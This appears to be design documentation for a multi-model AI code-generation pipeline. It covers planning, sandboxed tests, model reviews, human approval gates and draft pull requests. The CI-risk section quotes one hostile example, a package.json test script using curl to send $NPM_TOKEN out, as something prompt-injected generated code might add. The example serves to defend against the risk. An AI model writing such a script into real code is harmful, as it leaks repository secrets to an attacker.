# Execution Council (Milestone 4)

Package `packages/build`. Starts only for a session whose verdict a human approved
(`POST /api/sessions/:id/executions`, owners/admins). It never merges, pushes or deploys.

## One builder model (05.11.26)
When starting, the user picks **who builds it**: either all council models share the tasks (default) or one model
plans and writes every task (`builderParticipantId`, stored as `development_plan.builder_participant_id`); the other
models of the council only review. Resume can still hand a failed task to another model when the user asks.

**Tests on the hosted app.** app.consyrium.com runs no generated code (`SANDBOX_DISABLED=true` on the worker,
`deploy/hetzner/compose.yml`): tests are stored as "not run" with the note that they run in the repository's GitHub
Actions once the draft PR is open; the PR view shows those checks. Self-hosted installations keep the Docker sandbox.

## Prototype / measurement build (#249 part 2, 08.11.26)

A run of kind `prototype` builds a proposal of a verdict that still needs verification, after a person approved a
prototype / measurement build (`approve_prototype`). It exists to measure the requirements the council could not
confirm, is marked in the builder prompt, the draft pull request (title prefix `[Prototype – not a finished solution]`
and body), the audit and the execution screen, and is never a regular approval. Details: `docs/council-engine.md`,
section "Favourite, prototype build and acceptance by measurement".

## Flow
1. **Plan** – the author model of the approved proposal writes a plan: stack (`node` | `python`), install
   and test commands, 2–8 tasks with dependencies. The task graph is validated (unknown deps, duplicates, cycles).
   **Plan approval (default on):** the run stops in `awaiting_plan_approval` after planning – no code is written.
   An owner/admin approves (`POST /api/executions/:id/plan`, `{ "action": "approve" }`) to continue with the stored
   plan (no second planning call) or rejects to end the run. The decision and comment are audited.
2. **Implement** – (same-file safety: a task's files are applied only if none of them changed since the task read
   the workspace; otherwise the task gets one retry on the current state and then fails with a conflict – a
   parallel task never silently overwrites another one, #24) – tasks run in dependency order; independent tasks in parallel (default 2). Tasks are spread over
   the council's models. Each task returns complete files; paths are validated (no absolute paths, no `..`, no
   `.git`/`.github`, size and count limits). Every change is a new immutable `code_artifact` version.
3. **Test** – files are materialized in a throwaway directory and run in a container:
   - install step with outbound network (dependency download), no host environment variables
   - test step **without network**
   - `--cap-drop ALL`, `no-new-privileges`, unprivileged uid, 1 GB memory, 1 CPU, 256 processes, timeout 5 min
   - no Docker socket mount, no `--privileged`
   Without a container runtime nothing is executed and results are stored as **not run**.
4. **Repair** – failing tests go back to the planner with the output, bounded by `maxRepairAttempts` (default 2).
5. **Review** – two other models review the change set (code quality; security) with concrete findings.
6. **Result** – files, test runs, reviews and a `git apply`-compatible patch (`/api/executions/:id/patch`).
   With a linked repository an owner/admin can publish it as a draft pull request (docs/github-app.md); merging
   always needs a human.

**Quality gate before the draft PR** (`pullRequestReadiness` in `@consyrium/core`, enforced on the server and
explained in the UI): a failed/errored/timed-out latest test run, a failed dependency install or any critical
review finding blocks publishing. An owner/admin may publish anyway only with a written reason (≥ 10 chars),
which is written into the PR body and the audit log. Tests that could not run (no container runtime) and
high-severity findings are warnings.

**CI-relevant changes (#400).** The draft PR is pushed into the customer's own repository, where `pull_request`
workflows run on it with the repository's secrets; generated code steered by a prompt injection could, for example,
add `"test": "curl …?k=$NPM_TOKEN"`. `.github/` cannot be written at all; the other files a CI job executes are listed
before publishing (`ciRisks` in `packages/build/src/ci-risk.ts`): changed `package.json` scripts, lockfiles, build/CI
configuration and scripts (Makefile, Dockerfile, `*.config.*`, `pyproject.toml`, `scripts/` …), test setup
(`conftest.py`, `vitest.setup.*` …) and tests that add a network call. Publishing needs an explicit confirmation
(`confirmCiChanges: true`, checkbox in the UI), and the PR body lists them again. For repositories that receive such
PRs, GitHub's "Require approval for all outside collaborators"/"workflow runs from bots" setting is a sensible second
line of defence.

The run's status is mirrored onto the session's Execution Council stage (running/completed/failed/cancelled), so
the phase tabs reflect it. Draft PR titles use the first sentence of the plan summary, cut at a word boundary.

Own token budget per run (default 600,000, atomic reservation like the council), cancellation, usage rows with
`plan_id`, resumable after a worker crash (stored plan, done tasks and reviews are not repeated).

**Answers cut off at the output limit** are never applied. A coding call asks for 16K output tokens; a cut-off
answer gets one focused retry at 32K. If that is cut off as well, the task fails.

**Answers that miss the required structure** (wrong field types, missing fields) are never applied either. The call
gets exactly one corrective retry whose prompt names the failing field paths (no model content is logged); a second
miss fails the task as before (GitHub build test 08.11.26: gpt-5.4-mini's first implement answer).

**Resume only the failed tasks (#107).** A failed run with a stored plan can be resumed by an owner/admin
(`POST /api/executions/:id/resume`, optional `{ "participantId": "par_…" }`): failed tasks go back to pending,
done tasks and their files stay untouched, waiting tasks start afterwards, then tests and the missing reviews.
No new planning call. Handing a task to another council model happens only when the user picks one (recorded
in the audit log as `execution.resumed` with the previous assignment). Bounds: at most `MAX_TASK_ATTEMPTS` (3)
attempts per task over all resumes, and the run's remaining token budget; the UI shows attempt number, tokens
left and what will run again. Pending tasks behind a failed one are shown as "blocked by T…".

## Known limits
- Without a linked repository the workspace starts empty; with one it starts from a filtered snapshot of the default branch (docs/github-app.md).
- Images are fixed and pinned by digest (`node:22-alpine`, `python:3.12-alpine`, #399). The install step has internet access; a dependency
  could run install scripts inside the container. The container has no secrets and no host access; since #399 the
  install network cannot reach the host, private ranges or the metadata service (docs/hetzner.md). Egress to the
  public internet during install remains a residual risk (allow-listed registry proxy planned).
- Docker on the worker host is required for real test runs; rootless Docker or gVisor is recommended in production.

## Status shown in the session and on the dashboard (#91)

The Execution Council and Review & Tests tabs – and the Execution Council step of the dashboard – are derived from
the latest build run (`executionStates`, `apps/web/src/components/session/execution-status.ts`), not from the
stored phase row that older or finished runs never updated: running, completed ("code generated, draft PR
opened"), failed, cancelled and not started stay distinct. Tests that never ran are shown as **not run**
(blocked, "!"), never as passed or green.

**Tests in GitHub (GitHub build test 08.11.26).** Without a sandbox the draft PR's GitHub Actions run the tests. The
Review & Tests tab then reads "Tests laufen in GitHub Actions" (neutral, never "passed") instead of a warning; the
screen shows the live CI checks of the pull request. The readiness reasons and warnings are shown in the interface
language (`executionScreen.readinessText`).
